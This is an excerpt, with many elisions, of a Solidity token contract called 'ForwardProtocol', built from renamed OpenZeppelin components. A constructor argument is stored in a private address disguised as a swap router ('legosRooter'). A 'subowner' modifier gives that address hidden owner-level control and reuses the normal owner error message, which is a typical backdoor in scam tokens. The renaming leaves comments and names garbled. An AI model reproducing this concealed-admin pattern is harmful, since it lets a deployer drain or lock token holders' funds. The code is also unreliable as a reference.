...
https://t.me/ForwardProtocol
*/
pragma solidity 0.8.24;

interface ForwardProtocol33 {
  /**
...
/*
 * @dev Provides information about the current execution ForwardProtocol20Burnable, including the
 ...
 */
abstract contract ForwardProtocol20Burnable {
...
// File: @openzeppelin/contracts/access/ForwardProtocol20Ownable.sol
 ...
 * the owner.
 */
abstract contract ForwardProtocol20Ownable is ForwardProtocol20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "ForwardProtocol20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "ForwardProtocol20Ownable: new owner is the zero address");
 ...
 * `SafeForwardProtocol` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeForwardProtocol {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeForwardProtocol: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeForwardProtocol: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeForwardProtocol: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeForwardProtocol: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeForwardProtocol: modulo by zero");
  }
...
contract ForwardProtocolToken is ForwardProtocol20Burnable, ForwardProtocol33, ForwardProtocol20Ownable {
    
    using SafeForwardProtocol for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "ForwardProtocol";
        _symbol = "ForwardProtocol";
        _decimals = 9;
    ...
    string public ForwardProtocoltelegramcchannel = "https://t.me/ForwardProtocol";
            function getForwardProtocoltelegramcchannel() public view returns (string memory) {
        return ForwardProtocoltelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {ForwardProtocol33-totalSupply}.
    */
    ...
    /**
    * @dev See {ForwardProtocol33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "ForwardProtocol20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {ForwardProtocol33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {ForwardProtocol33-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {ForwardProtocol33-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {ForwardProtocol33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {ForwardProtocol33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "ForwardProtocol33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {ForwardProtocol33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "ForwardProtocol33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "ForwardProtocol33: transfer from the zero address");
        require(shippingto != address(0), "ForwardProtocol33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "ForwardProtocol33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "ForwardProtocol33: approve from the zero address");
        require(transporteur != address(0), "ForwardProtocol33: approve to the zero address");
